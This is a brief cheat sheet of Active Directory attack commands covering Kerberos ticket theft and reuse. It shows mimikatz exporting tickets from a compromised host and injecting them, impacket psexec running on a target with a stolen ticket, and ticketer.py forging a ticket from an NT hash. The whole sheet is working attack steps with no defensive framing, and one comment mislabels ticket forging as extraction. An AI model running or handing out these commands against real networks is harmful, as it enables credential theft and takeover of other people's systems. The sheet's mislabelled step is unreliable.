# Export tickets from compromised host
mimikatz "privilege::debug" "sekurlsa::tickets /export"

# Load ticket
mimikatz "kerberos::ptt ticket.kirbi"

# Using impacket with ticket
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass domain/user@TARGET

# Extract tickets from Linux
python3 ticketer.py -nthash NT_HASH -domain-sid SID -domain domain.local user

# Convert kirbi to ccache
python3 kirbi2ccache.py ticket.kirbi ticket.ccache